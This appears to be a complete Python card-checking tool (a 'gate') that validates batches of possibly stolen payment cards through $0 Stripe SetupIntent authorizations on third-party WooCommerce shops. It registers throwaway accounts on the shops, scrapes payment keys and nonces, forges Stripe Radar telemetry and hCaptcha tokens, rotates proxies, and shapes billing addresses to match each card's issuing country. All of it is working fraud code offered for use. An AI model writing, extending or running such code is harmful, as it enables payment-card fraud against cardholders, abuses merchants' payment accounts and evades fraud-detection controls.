# language: Python 3.12+, file: setup_gate.py, target: Windows 11, deps: curl_cffi
# S-Tier Stripe SetupIntent Auth Engine (Evelyn Architecture)
# Одна авторизованная WP-сессия на донора обслуживает всю пачку карт.
import asyncio
import json
import os
import sys
import time
from datetime import datetime
from curl_cffi.requests import AsyncSession

import gate_client as gc

try:
    from proxy_manager import ProxyPool
    HAS_PROXY_POOL = True
except Exception:
    HAS_PROXY_POOL = False

sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")

FALLBACK_DONOR = "https://www.blackbeltprotein.com.au"


async def bin_lookup(bin_num: str) -> dict:
    # binlist -> handyapi fallback, на движке curl_cffi
    async with AsyncSession(impersonate="chrome131", verify=False) as s:
        try:
            r = await s.get(f"https://lookup.binlist.net/{bin_num}",
                            headers={"Accept-Version": "3"}, timeout=6)
            if r.status_code == 200:
                return r.json()
        except Exception:
            pass
        try:
            r = await s.get(f"https://data.handyapi.com/bin/{bin_num}", timeout=6)
            if r.status_code == 200:
                return r.json()
        except Exception:
            pass
    return {}


def bin_summary(binfo: dict) -> str:
    # binlist отдаёт lower-case ключи, handyapi — Capitalized; покрываем оба
    if not binfo:
        return "?"
    g = lambda *keys: next((binfo[k] for k in keys if k in binfo and binfo[k]), "")
    bank = g("bank", "Bank")
    country = g("country", "Country")
    parts = [
        str(g("scheme", "Scheme") or "?"),
        str(g("type", "Type")),
        str(country.get("alpha2", "") if isinstance(country, dict) else ""),
    ]
    if isinstance(bank, dict) and bank.get("name"):
        parts.append(str(bank["name"])[:18])
    out = "/".join(p for p in parts if p and p != "?")
    return out or "?"


def bin_alpha2(binfo: dict) -> str:
    """Страна эмитента из любого формата ответа; '' если не определена."""
    if not binfo:
        return ""
    c = binfo.get("country") or binfo.get("Country")
    if isinstance(c, dict):
        return (c.get("alpha2") or c.get("Alpha2") or "").upper()
    if isinstance(c, str) and len(c.strip()) == 2:
        return c.strip().upper()
    return ""


def load_ready_gates() -> list[dict]:
    candidates = ["data/ready_gates.json", "ready_gates.json"]
    for path in candidates:
        if os.path.exists(path):
            try:
                with open(path, "r", encoding="utf-8") as f:
                    gates = json.load(f)
                    if isinstance(gates, list) and gates:
                        valid = [g for g in gates if g.get("base_url") or g.get("domain")]
                        if valid:
                            return valid
            except Exception:
                pass
    return [{
        "domain": "www.blackbeltprotein.com.au",
        "base_url": FALLBACK_DONOR,
        "reg_url": f"{FALLBACK_DONOR}/my-account/",
        "add_pm_url": f"{FALLBACK_DONOR}/my-account/add-payment-method/",
        "ajax_url": f"{FALLBACK_DONOR}/wp-admin/admin-ajax.php",
        "gate_type": "wc_stripe_upe"
    }]


def gate_urls(gate_info: dict) -> dict:
    base = gate_info.get("base_url", FALLBACK_DONOR).rstrip("/")
    return {
        "base": base,
        "reg_url": gate_info.get("reg_url", f"{base}/my-account/"),
        "add_pm_url": gate_info.get("add_pm_url", f"{base}/my-account/add-payment-method/"),
        "ajax_url": gate_info.get("ajax_url", f"{base}/wp-admin/admin-ajax.php"),
    }


def err_result(card_raw: str, detail: str) -> dict:
    return {"card": card_raw, "status": "ERROR", "detail": detail, "retry_next_gate": True}


def append_result_log(rec: dict):
    # Пакет 1: каждый прогон — строка в data/results/YYYY-MM-DD.jsonl
    os.makedirs(os.path.join("data", "results"), exist_ok=True)
    fn = os.path.join("data", "results", f"{datetime.now():%Y-%m-%d}.jsonl")
    with open(fn, "a", encoding="utf-8") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")


def mark_gate_field(domain: str, **fields):
    # Sprint 3.4: точечная запись полей донора (captcha_on_add_card и т.п.)
    path = os.path.join("data", "ready_gates.json")
    if not os.path.exists(path):
        return
    try:
        with open(path, "r", encoding="utf-8") as f:
            gates = json.load(f)
        changed = False
        for g in gates:
            if g.get("domain") == domain:
                g.update(fields)
                changed = True
        if changed:
            with open(path, "w", encoding="utf-8") as f:
                json.dump(gates, f, indent=2)
    except Exception as e:
        print(f"[!] gate-field writeback failed: {e}", flush=True)


def update_gate_health(domain: str, ok: bool, fail_limit: int = 3, latency_ms: int | None = None):
    # Пакет 3 + Sprint 3.3: fail-логика как была, плюс скользящие метрики
    # (EMA success_rate, средняя латентность, счётчик карт) для взвешенной ротации.
    path = os.path.join("data", "ready_gates.json")
    if not os.path.exists(path):
        return
    try:
        with open(path, "r", encoding="utf-8") as f:
            gates = json.load(f)
        changed, kept = False, []
        for g in gates:
            if g.get("domain") != domain:
                kept.append(g)
                continue
            changed = True
            checked = int(g.get("cards_checked", 0)) + 1
            g["cards_checked"] = checked
            if latency_ms:
                prev = float(g.get("latency_avg_ms") or latency_ms)
                g["latency_avg_ms"] = int((prev * (checked - 1) + latency_ms) / checked)
            ema = float(g.get("success_rate", 0.5))
            g["success_rate"] = round(ema * 0.9 + (1.0 if ok else 0.0) * 0.1, 4)
            if ok:
                g["fail_count"] = 0
                g["updated_at"] = int(time.time())
                g["last_success_ts"] = int(time.time())
                kept.append(g)
            else:
                fc = g.get("fail_count", 0) + 1
                if fc < fail_limit:
                    g["fail_count"] = fc
                    kept.append(g)
                else:
                    print(f"    [x] {domain}: {fc} consecutive failures — dropped from pool", flush=True)
        if changed:
            with open(path, "w", encoding="utf-8") as f:
                json.dump(kept, f, indent=2)
    except Exception as e:
        print(f"[!] gate-health writeback failed: {e}", flush=True)


async def _close_session(s: AsyncSession | None):
    if s is None:
        return
    try:
        await s.close()
    except Exception:
        pass


class GateSession:
    """Авторизованная WP-сессия на одного донора: регистрация один раз,
    дальше вся пачка карт идёт через add-payment-method этой учётки."""

    def __init__(self, gate_info: dict, proxy: str | None = None):
        self.gate = gate_info
        self.u = gate_urls(gate_info)
        self.proxy = proxy
        self.s: AsyncSession | None = None
        self.pk = ""
        self.upe_nonce = ""
        self.legacy_nonce = ""
        self.telem: dict | None = None
        self.account_email = ""
        # Sprint 1 state: живые Radar-cookie и hcaptcha-токен
        self.hcaptcha_token: str | None = None
        self.stripe_cookies: dict = {"mid": "", "sid": ""}

    async def open(self) -> tuple[bool, str]:
        base = self.u["base"]
        reg_url = self.u["reg_url"]
        s = AsyncSession(impersonate="chrome131", verify=False, proxy=self.proxy)
        try:
            # 1. GET /my-account/ — nonce регистрации + детект капчи
            r = await s.get(reg_url, timeout=12)
            if r.status_code != 200:
                await _close_session(s)
                return False, f"GET reg HTTP {r.status_code}"
            html = r.text
            reg_nonce = gc.extract_reg_nonce(html)
            if not reg_nonce:
                await _close_session(s)
                return False, "Closed reg or captcha on /my-account/"

            # 2. Регистрация временной учётки (honeypot-поля из формы)
            ident = gc.random_identity()
            self.account_email = ident["email"]
            body = {
                "email": ident["email"],
                "password": ident["password"],
                "woocommerce-register-nonce": reg_nonce,
                "_wp_http_referer": "/my-account/",
                "register": "Register",
            }
            if 'name="username"' in html:
                body["username"] = ident["username"]
            gc.extract_honeypot_fields(gc.extract_register_form_html(html), body)

            await s.post(reg_url, data=body,
                         headers={"Origin": base, "Referer": reg_url}, timeout=15)
            cookies = s.cookies.get_dict()
            if not any("wordpress_logged_in" in k for k in cookies):
                await _close_session(s)
                return False, "Bot challenge / anti-spam blocked login cookie"

            # 3. Скрап nonces со страницы добавления платёжного метода
            r_pm = await s.get(self.u["add_pm_url"], timeout=12)
            if gc.looks_like_captcha(r_pm.text):
                # Sprint 3.4: донора не выбрасываем — помечаем и понижаем вес
                mark_gate_field(self.gate.get("domain"), captcha_on_add_card=True)
                await _close_session(s)
                return False, "CAPTCHA on add-payment-method (donor kept, weight lowered)"
            scraped = gc.scrape_gate(r_pm.text)
            if not scraped["pk"] or (not scraped["upe_nonce"] and not scraped["legacy_nonce"]):
                await _close_session(s)
                return False, "PK or SetupIntent nonce missing on add-payment-method"

            self.s = s
            self.pk = scraped["pk"]
            self.upe_nonce = scraped["upe_nonce"]
            self.legacy_nonce = scraped["legacy_nonce"]

            # 3b. hcaptcha_token для radar_options (fallback — шлём без токена)
            donor_host = base.replace("https://", "").replace("http://", "")
            self.hcaptcha_token = await gc.fetch_hcaptcha_radar_token(s, self.pk, donor_host)

            # 4. Beacon POST m.stripe.com/6 — сервер минтует живые muid/guid/sid (Radar)
            live_ids = {"muid": "", "sid": "", "guid": ""}
            try:
                r_m = await s.post("https://m.stripe.com/6",
                                   data=gc.m_stripe_beacon_payload(),
                                   headers={"Origin": "https://js.stripe.com",
                                            "Referer": "https://js.stripe.com/", "Accept": "*/*"},
                                   timeout=6)
                if r_m.status_code == 200:
                    live_ids = gc.parse_m_stripe_response(r_m.json())
            except Exception:
                pass
            self.stripe_cookies = {"mid": live_ids["muid"], "sid": live_ids["sid"]}

            self.telem = gc.stripe_telemetry(base, scraped["pk"],
                                             muid=live_ids["muid"], sid=live_ids["sid"])
            if live_ids["guid"]:
                self.telem["guid"] = live_ids["guid"]
            if self.hcaptcha_token:
                self.telem["_hcaptcha_token"] = self.hcaptcha_token
            return True, ""
        except Exception as e:
            await _close_session(s)
            return False, f"{type(e).__name__}: {e}"

    async def refresh_nonces(self) -> bool:
        if self.s is None:
            return False
        try:
            r_pm = await self.s.get(self.u["add_pm_url"], timeout=12)
            scraped = gc.scrape_gate(r_pm.text)
            if not scraped["pk"] or (not scraped["upe_nonce"] and not scraped["legacy_nonce"]):
                return False
            self.pk = scraped["pk"]
            self.upe_nonce = scraped["upe_nonce"]
            self.legacy_nonce = scraped["legacy_nonce"]
            return True
        except Exception:
            return False

    async def _confirm_setup_intent(self, pm_id: str) -> dict | None:
        attribution = gc.wc_attribution_fields(self.u["base"])
        if self.upe_nonce:
            body = {
                "action": "wc_stripe_create_and_confirm_setup_intent",
                "_ajax_nonce": self.upe_nonce,
                "wc-stripe-payment-method": pm_id,
                "wc-stripe-payment-type": "card",
                **attribution,
            }
            url = self.u["ajax_url"]
        else:
            body = {"stripe_source_id": pm_id, "nonce": self.legacy_nonce, **attribution}
            url = f"{self.u['base']}/?wc-ajax=wc_stripe_create_setup_intent"
        try:
            r = await self.s.post(url, data=body,
                                  headers=gc.ajax_headers_for(self.u["base"], self.u["add_pm_url"]),
                                  timeout=15)
            return r.json()
        except Exception:
            return None

    async def check_card(self, card_raw: str, bin_alpha2: str = "US") -> dict:
        card = gc.parse_card(card_raw)
        # Гео-выравнивание billing по BIN карты (Sprint 1.3): адрес держателя
        # подстраивается под страну эмитента, имя остаётся от сессии.
        telem = dict(self.telem)
        if bin_alpha2 and bin_alpha2.upper() != (self.telem.get("country") or "US").upper():
            telem.update(gc.geo_identity_fields(bin_alpha2))
        tok_body = gc.tokenize_body(card, telem, self.u["base"])

        try:
            r_tok = await self.s.post("https://api.stripe.com/v1/payment_methods",
                                      data=tok_body, headers=gc.TOKENIZE_HEADERS, timeout=10)
            tok_data = r_tok.json()
        except Exception as e:
            return {"card": card_raw, "status": "ERROR",
                    "detail": f"Stripe tokenize error: {e}", "retry_next_gate": False}

        if "id" not in tok_data:
            err = tok_data.get("error", {}).get("message", str(tok_data))
            code = tok_data.get("error", {}).get("code", "tokenize_error")
            return {"card": card_raw, "status": f"DECLINED@{code.upper()}",
                    "detail": err, "retry_next_gate": False}

        pm_id = tok_data["id"]

        # Confirm с одним авто-ретраем при протухшем nonce
        conf_resp = await self._confirm_setup_intent(pm_id)
        if conf_resp is None:
            return {"card": card_raw, "status": "ERROR",
                    "detail": "SetupIntent confirm network error", "retry_next_gate": True}
        if gc.is_nonce_rejection(conf_resp):
            if await self.refresh_nonces():
                conf_resp = await self._confirm_setup_intent(pm_id)
                if conf_resp is None:
                    return {"card": card_raw, "status": "ERROR",
                            "detail": "SetupIntent confirm network error (after nonce refresh)",
                            "retry_next_gate": True}
            else:
                return {"card": card_raw, "status": "ERROR",
                        "detail": "Nonce rejected, refresh failed", "retry_next_gate": True}

        if conf_resp.get("success") is True or conf_resp.get("status") == "success":
            data = conf_resp.get("data", {})
            st = data.get("status", "succeeded")
            if st == "succeeded":
                return {"card": card_raw, "status": "APPROVED",
                        "detail": f"SetupIntent {data.get('id', '')} Succeeded ($0 auth passed)",
                        "retry_next_gate": False}
            if st == "requires_action":
                return {"card": card_raw, "status": "3DS_REQUIRED",
                        "detail": "Card LIVE, enrolled in 3DS (SetupIntent requires OTP action)",
                        "retry_next_gate": False}
            return {"card": card_raw, "status": str(st).upper(),
                    "detail": json.dumps(data), "retry_next_gate": False}

        err_msg = ""
        if isinstance(conf_resp.get("data"), dict):
            err_msg = conf_resp["data"].get("error", {}).get("message", "")
            if not err_msg:
                err_msg = conf_resp["data"].get("message", "")
        if not err_msg:
            err_msg = conf_resp.get("message", json.dumps(conf_resp))

        return {"card": card_raw, "status": gc.classify_verdict(err_msg),
                "detail": err_msg, "retry_next_gate": False}

    async def close(self):
        await _close_session(self.s)
        self.s = None


async def main():
    raw_args = sys.argv[1:]
    explicit_proxy = None
    while "--proxy" in raw_args:
        i = raw_args.index("--proxy")
        if i + 1 < len(raw_args):
            explicit_proxy = raw_args[i + 1]
            del raw_args[i:i + 2]
        else:
            del raw_args[i]
    proxy_pool = gc.load_proxies()
    proxy_manager: "ProxyPool | None" = None
    if HAS_PROXY_POOL and proxy_pool and not explicit_proxy:
        proxy_manager = ProxyPool(proxy_pool)
        alive, total = await proxy_manager.validate_all()
        print(f"[*] Proxy pool: {proxy_manager.status_line()}")
        if alive == 0:
            print("[!] All proxies dead — running direct")
            proxy_manager = None
    custom_donor = None
    if raw_args and raw_args[0].startswith("http"):
        custom_donor = raw_args[0].rstrip("/")
        raw_args = raw_args[1:]

    cards = []
    for a in raw_args:
        if os.path.exists(a):
            with open(a, encoding="utf-8") as f:
                cards.extend([l.strip() for l in f if l.strip() and not l.startswith("#")])
        else:
            cards.append(a.strip())

    if not cards:
        probe = gc.gen_probe_card()
        cards = [f"{probe['number']}|{probe['mm']}|{probe['yy']}|{probe['cvc']}"]
        print(f"[*] No cards given — using random Luhn-valid probe: {cards[0]}")

    # Pre-flight: Luhn sanity + BIN enrichment
    bins: dict[str, dict] = {}
    for idx, c in enumerate(cards, 1):
        parts = c.split("|")
        num = parts[0].strip()
        if not gc.check_luhn(num):
            print(f"[!] WARNING: card #{idx} fails Luhn: {num}")
        if len(parts) < 4 or parts[3].strip() == "000":
            print(f"[!] WARNING: card #{idx} has no/zero CVC — random generated, best case CCN-verdict")
    for prefix in sorted({c.split("|")[0][:6] for c in cards}):
        bins[prefix] = await bin_lookup(prefix)
        if bins[prefix]:
            print(f"[i] BIN {prefix}: {bin_summary(bins[prefix])}")

    if custom_donor:
        gates_pool = [{
            "domain": custom_donor.replace("https://", "").replace("http://", ""),
            "base_url": custom_donor,
            "reg_url": f"{custom_donor}/my-account/",
            "add_pm_url": f"{custom_donor}/my-account/add-payment-method/",
            "ajax_url": f"{custom_donor}/wp-admin/admin-ajax.php",
            "gate_type": "wc_stripe_upe"
        }]
    else:
        gates_pool = load_ready_gates()

    print("=" * 80)
    print("[*] S-TIER WOOCOMMERCE STRIPE SETUPINTENT GATE ($0 AUTH)")
    print(f"[*] Engine: curl_cffi Chrome TLS + Radar Telemetry + Session Reuse")
    print(f"[*] Active Gate Pool: {len(gates_pool)} donor(s)")
    for idx, g in enumerate(gates_pool[:3], 1):
        print(f"    [{idx}] {g.get('domain', g.get('base_url'))}")
    if len(gates_pool) > 3:
        print(f"    ... and {len(gates_pool) - 3} more")
    print(f"[*] Total Cards to Check: {len(cards)}")
    proxy_label = (f"--proxy {explicit_proxy}" if explicit_proxy
                   else (f"{len(proxy_pool)} from data/proxies.txt" if proxy_pool else "direct (no pool)"))
    print(f"[*] Proxy: {proxy_label}")
    print("=" * 80)

    results = []
    sessions_cache: dict[str, GateSession] = {}
    sessions_opened = 0
    # Sprint 3.3: взвешенная перестановка пула — сильные доноры впереди,
    # но каждый получает попытку (порядок фиксирован на прогон)
    ordered_pool = gc.pick_gate_order(gates_pool)

    try:
        for i, c in enumerate(cards):
            res = None
            for attempt in range(len(ordered_pool)):
                gate = ordered_pool[attempt]
                dom = gate.get("domain") or gate.get("base_url")

                gs = sessions_cache.get(dom)
                if gs is None:
                    # Sprint 3.5: sticky-прокси на донора — одна сессия = один IP
                    if proxy_manager is not None:
                        chosen_proxy = proxy_manager.pick(sticky_key=dom) or gc.pick_proxy(proxy_pool, explicit_proxy)
                    else:
                        chosen_proxy = gc.pick_proxy(proxy_pool, explicit_proxy)
                    gs = GateSession(gate, proxy=chosen_proxy)
                    ok, detail = await gs.open()
                    if not ok:
                        res = err_result(c, detail)
                        if proxy_manager is not None and chosen_proxy:
                            proxy_manager.mark_bad(chosen_proxy)
                        if not custom_donor:
                            update_gate_health(dom, False)
                        append_result_log({
                            "ts": datetime.now().isoformat(timespec="seconds"),
                            "card": gc.mask_pan(c),
                            "bin": bin_summary(bins.get(c.split("|")[0][:6], {})),
                            "donor": dom,
                            "status": "ERROR",
                            "detail": str(detail)[:200],
                            "latency_ms": 0,
                        })
                        print(f"    [!] Donor {dom} failed ({detail}). Rotating to next donor...", flush=True)
                        continue
                    sessions_cache[dom] = gs
                    sessions_opened += 1
                    print(f"    [+] Session opened on {dom} (acct {gs.account_email})", flush=True)

                t0 = time.perf_counter()
                res = await gs.check_card(c, bin_alpha2=bin_alpha2(bins.get(c.split("|")[0][:6], {})))
                latency_ms = int((time.perf_counter() - t0) * 1000)
                if not custom_donor:
                    update_gate_health(dom, not res.get("retry_next_gate"), latency_ms=latency_ms)
                append_result_log({
                    "ts": datetime.now().isoformat(timespec="seconds"),
                    "card": gc.mask_pan(res.get("card", c)),
                    "bin": bin_summary(bins.get(c.split("|")[0][:6], {})),
                    "donor": dom,
                    "status": res.get("status"),
                    "detail": str(res.get("detail", ""))[:200],
                    "latency_ms": latency_ms,
                })
                if not res.get("retry_next_gate"):
                    break

                # гейт-левел отказ — сбрасываем сессию, ротация
                await sessions_cache.pop(dom).close()
                print(f"    [!] Donor {dom} failed ({res['detail']}). Rotating to next donor...", flush=True)

            results.append(res)
            status_style = res['status']
            print(f">>> [{status_style:16}] {res['card']} -> {res['detail']}", flush=True)
            if i < len(cards) - 1:
                await asyncio.sleep(2)
    finally:
        for gs in sessions_cache.values():
            await gs.close()

    print("\n" + "=" * 80)
    print("[*] SUMMARY:")
    for r in results:
        prefix = r["card"].split("|")[0][:6]
        bs = bin_summary(bins.get(prefix, {}))
        print(f"  {r['status']:16} {r['card']:30} [{bs}] {r['detail']}")
    print(f"[*] Registrations this run: {sessions_opened} for {len(cards)} card(s)")
    print("=" * 80)


if __name__ == "__main__":
    asyncio.run(main())
